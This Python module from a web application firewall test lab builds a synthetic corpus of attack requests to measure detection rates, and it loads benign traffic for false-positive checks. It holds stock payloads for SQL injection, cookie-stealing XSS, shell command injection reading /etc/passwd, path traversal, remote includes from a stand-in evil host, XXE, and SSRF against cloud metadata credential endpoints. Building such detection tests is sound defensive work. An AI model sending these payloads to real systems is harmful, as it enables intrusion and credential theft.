"""Synthetic attack-payload corpus and benign-traffic loader for the waffy attack-lab.

Every attack payload defined here is hand-authored and self-contained per
docs/MASTER_SPEC.md §22 — nothing is downloaded or fetched from a live
source at test/runtime. The benign corpus is loaded from the existing
tests/security/fixtures/benign/benign_traffic.json fixture rather than
duplicated, so both the false-positive unit test and this runner measure
against the same known-benign traffic.

This is a measurement tool, not a tuning tool: it must never be edited to
make detection numbers look better. If a category's true-positive rate is
below 100%, or the benign corpus produces a false positive, report it.
"""

from __future__ import annotations

import json
from dataclasses import dataclass, field
from pathlib import Path
from urllib.parse import parse_qs

from waffy.core.enums import HttpMethod, SignatureCategory
from waffy.core.models.domain import HttpRequestRecord

REPO_ROOT = Path(__file__).resolve().parents[2]
BENIGN_CORPUS_PATH = (
    REPO_ROOT / "tests" / "security" / "fixtures" / "benign" / "benign_traffic.json"
)


@dataclass(frozen=True)
class AttackCase:
    """One synthetic attack payload aimed at a specific signature category."""

    name: str
    category: SignatureCategory
    method: HttpMethod = HttpMethod.GET
    path: str = "/"
    query_params: dict[str, list[str]] = field(default_factory=dict)
    parsed_body_summary: dict[str, object] = field(default_factory=dict)
    raw_body: bytes = b""
    headers: list[tuple[str, str]] = field(default_factory=list)
    cookies: dict[str, str] = field(default_factory=dict)

    def to_request(self) -> HttpRequestRecord:
        """Build the canonical HttpRequestRecord for this payload."""
        qs = "&".join(f"{k}={v}" for k, values in self.query_params.items() for v in values)
        return HttpRequestRecord(
            method=self.method,
            path=self.path,
            query_string=qs,
            query_params=self.query_params,
            headers=self.headers,
            cookies=self.cookies,
            client_ip="203.0.113.7",
            parsed_body_summary=self.parsed_body_summary,
        )


# Every category from docs/MASTER_SPEC.md §7 that ships a seed signature gets
# multiple deliberately distinct payload variants so a per-category
# true-positive rate is a real measurement, not a single coin flip.
ATTACK_CORPUS: dict[SignatureCategory, list[AttackCase]] = {
    SignatureCategory.SQLI: [
        AttackCase(
            name="union_select",
            category=SignatureCategory.SQLI,
            path="/products",
            query_params={"id": ["1 UNION SELECT null,username,password FROM users"]},
        ),
        AttackCase(
            name="boolean_blind_comment_truncation",
            category=SignatureCategory.SQLI,
            path="/login",
            query_params={"user": ["admin' OR '1'='1'--"]},
        ),
        AttackCase(
            name="time_blind_sleep",
            category=SignatureCategory.SQLI,
            path="/search",
            query_params={"q": ["1; SELECT SLEEP(5)--"]},
        ),
    ],
    SignatureCategory.XSS: [
        AttackCase(
            name="script_tag",
            category=SignatureCategory.XSS,
            method=HttpMethod.POST,
            path="/comment",
            parsed_body_summary={"comment": "<script>alert(document.cookie)</script>"},
            raw_body=b"<script>alert(document.cookie)</script>",
        ),
        AttackCase(
            name="onerror_handler",
            category=SignatureCategory.XSS,
            path="/profile",
            query_params={"bio": ["<img src=x onerror=alert(1)>"]},
        ),
        AttackCase(
            name="onload_handler",
            category=SignatureCategory.XSS,
            path="/profile",
            query_params={"bio": ["<body onload=alert(document.domain)>"]},
        ),
    ],
    SignatureCategory.COMMAND_INJECTION: [
        AttackCase(
            name="semicolon_chain",
            category=SignatureCategory.COMMAND_INJECTION,
            path="/ping",
            query_params={"host": ["127.0.0.1; cat /etc/passwd"]},
        ),
        AttackCase(
            name="pipe_chain",
            category=SignatureCategory.COMMAND_INJECTION,
            path="/ping",
            query_params={"host": ["127.0.0.1 | whoami"]},
        ),
        AttackCase(
            name="backtick_substitution",
            category=SignatureCategory.COMMAND_INJECTION,
            path="/ping",
            query_params={"host": ["`id`"]},
        ),
        AttackCase(
            name="dollar_paren_substitution",
            category=SignatureCategory.COMMAND_INJECTION,
            path="/ping",
            query_params={"host": ["$(uname -a)"]},
        ),
    ],
    SignatureCategory.PATH_TRAVERSAL: [
        AttackCase(
            name="unix_dotdot",
            category=SignatureCategory.PATH_TRAVERSAL,
            path="/download",
            query_params={"file": ["../../../../etc/passwd"]},
        ),
        AttackCase(
            name="windows_dotdot",
            category=SignatureCategory.PATH_TRAVERSAL,
            path="/download",
            query_params={"file": ["..\\..\\windows\\system32\\config"]},
        ),
        AttackCase(
            name="direct_sensitive_file",
            category=SignatureCategory.PATH_TRAVERSAL,
            path="/download",
            query_params={"file": ["/etc/shadow"]},
        ),
    ],
    SignatureCategory.LFI_RFI: [
        AttackCase(
            name="php_input_wrapper",
            category=SignatureCategory.LFI_RFI,
            path="/render",
            query_params={"template": ["php://input"]},
        ),
        AttackCase(
            name="remote_php_include",
            category=SignatureCategory.LFI_RFI,
            path="/render",
            query_params={"template": ["http://evil.example.com/shell.php"]},
        ),
        AttackCase(
            name="data_wrapper",
            category=SignatureCategory.LFI_RFI,
            path="/render",
            query_params={"template": ["data://text/plain;base64,PD9waHAgc3lzdGVtKCk7"]},
        ),
    ],
    SignatureCategory.SSTI: [
        AttackCase(
            name="arithmetic_probe",
            category=SignatureCategory.SSTI,
            method=HttpMethod.POST,
            path="/render",
            parsed_body_summary={"name": "{{7*7}}"},
            raw_body=b"{{7*7}}",
        ),
        AttackCase(
            name="config_object",
            category=SignatureCategory.SSTI,
            method=HttpMethod.POST,
            path="/render",
            parsed_body_summary={"name": "{{config}}"},
            raw_body=b"{{config}}",
        ),
        AttackCase(
            name="freemarker_runtime",
            category=SignatureCategory.SSTI,
            method=HttpMethod.POST,
            path="/render",
            parsed_body_summary={"name": "${Runtime.getRuntime()}"},
            raw_body=b"${Runtime.getRuntime()}",
        ),
    ],
    SignatureCategory.XXE: [
        AttackCase(
            name="external_entity_file_read",
            category=SignatureCategory.XXE,
            method=HttpMethod.POST,
            path="/import",
            raw_body=(
                b'<?xml version="1.0"?><!DOCTYPE foo ['
                b'<!ENTITY xxe SYSTEM "file:///etc/passwd">]>'
                b"<foo>&xxe;</foo>"
            ),
        ),
        AttackCase(
            name="doctype_with_internal_subset",
            category=SignatureCategory.XXE,
            method=HttpMethod.POST,
            path="/import",
            raw_body=b'<?xml version="1.0"?><!DOCTYPE foo [<!ELEMENT foo ANY>]><foo/>',
        ),
    ],
    SignatureCategory.DESERIALIZATION: [
        AttackCase(
            name="php_serialized_object",
            category=SignatureCategory.DESERIALIZATION,
            method=HttpMethod.POST,
            path="/import",
            raw_body=b'O:8:"stdClass":1:{s:4:"data";s:4:"evil";}',
        ),
        AttackCase(
            name="java_base64_magic_bytes",
            category=SignatureCategory.DESERIALIZATION,
            method=HttpMethod.POST,
            path="/import",
            raw_body=b"rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcA==",
        ),
    ],
    SignatureCategory.CRLF_INJECTION: [
        AttackCase(
            name="percent_encoded_set_cookie",
            category=SignatureCategory.CRLF_INJECTION,
            path="/redirect",
            query_params={"next": ["/home%0d%0aSet-Cookie:session=hijacked"]},
        ),
        AttackCase(
            name="literal_crlf_location",
            category=SignatureCategory.CRLF_INJECTION,
            path="/redirect",
            query_params={"next": ["/home\r\nLocation: http://evil.example.com"]},
        ),
    ],
    SignatureCategory.OPEN_REDIRECT: [
        AttackCase(
            name="absolute_external_url",
            category=SignatureCategory.OPEN_REDIRECT,
            path="/redirect",
            query_params={"url": ["https://evil.example.com/phish"]},
        ),
        AttackCase(
            name="protocol_relative_url",
            category=SignatureCategory.OPEN_REDIRECT,
            path="/redirect",
            query_params={"url": ["//evil.example.com/steal"]},
        ),
    ],
    SignatureCategory.SSRF: [
        AttackCase(
            name="aws_azure_metadata_ip",
            category=SignatureCategory.SSRF,
            path="/fetch",
            query_params={"url": ["http://169.254.169.254/latest/meta-data/iam/security-credentials/"]},
        ),
        AttackCase(
            name="gcp_metadata_hostname",
            category=SignatureCategory.SSRF,
            path="/fetch",
            query_params={"target": ["http://metadata.google.internal/computeMetadata/v1/"]},
        ),
        AttackCase(
            name="loopback_url_scheme",
            category=SignatureCategory.SSRF,
            path="/fetch",
            query_params={"dest": ["http://127.0.0.1:6379/"]},
        ),
        AttackCase(
            name="rfc1918_url_scheme",
            category=SignatureCategory.SSRF,
            path="/fetch",
            query_params={"proxy": ["http://192.168.1.1/admin"]},
        ),
        AttackCase(
            name="gopher_scheme_redis_smuggling",
            category=SignatureCategory.SSRF,
            path="/fetch",
            query_params={"feed": ["gopher://127.0.0.1:6379/_SET%20key%20value"]},
        ),
        AttackCase(
            # Deliberately NOT an internal/metadata IP -- this case only
            # matches WAFFY-SSRF-004 (the PL2-gated name+value heuristic),
            # not WAFFY-SSRF-001..003, so it distinctly exercises the
            # lower-confidence paranoia-level-2 gating rather than
            # overlapping with the other three rules.
            name="webhook_param_name_absolute_url",
            category=SignatureCategory.SSRF,
            path="/register",
            query_params={"webhook": ["http://attacker-controlled.example/notify"]},
        ),
    ],
    SignatureCategory.SCANNER_FINGERPRINT: [
        AttackCase(
            name="sqlmap_ua",
            category=SignatureCategory.SCANNER_FINGERPRINT,
            path="/",
            headers=[("user-agent", "sqlmap/1.7.2#stable (http://sqlmap.org)")],
        ),
        AttackCase(
            name="nikto_ua",
            category=SignatureCategory.SCANNER_FINGERPRINT,
            path="/",
            headers=[("user-agent", "Mozilla/5.00 (Nikto/2.5.0)")],
        ),
        AttackCase(
            name="nuclei_ua",
            category=SignatureCategory.SCANNER_FINGERPRINT,
            path="/",
            headers=[("user-agent", "Nuclei - Fast and customizable vulnerability scanner")],
        ),
    ],
}


def load_benign_corpus() -> list[HttpRequestRecord]:
    """Load the shared synthetic benign-traffic fixture as HttpRequestRecords.

    Reuses tests/security/fixtures/benign/benign_traffic.json — the same
    fixture backing tests/unit/test_detection_engine.py's false-positive
    check — so both measurements are against identical known-benign traffic.
    """
    with open(BENIGN_CORPUS_PATH, encoding="utf-8") as f:
        items: list[dict[str, object]] = json.load(f)

    records: list[HttpRequestRecord] = []
    for item in items:
        query = str(item.get("query", ""))
        headers_raw = item.get("headers", [])
        headers: list[tuple[str, str]] = [(str(h[0]), str(h[1])) for h in headers_raw]  # type: ignore[index]
        records.append(
            HttpRequestRecord(
                method=HttpMethod(str(item["method"])),
                path=str(item["path"]),
                query_string=query,
                query_params=parse_qs(query, keep_blank_values=True),
                headers=headers,
                client_ip="192.168.1.100",
                parsed_body_summary={},
            )
        )
    return records


def benign_raw_bodies() -> list[bytes]:
    """Return the raw body bytes for each benign corpus item, aligned by index."""
    with open(BENIGN_CORPUS_PATH, encoding="utf-8") as f:
        items: list[dict[str, object]] = json.load(f)
    return [str(item.get("body", "")).encode("utf-8") for item in items]
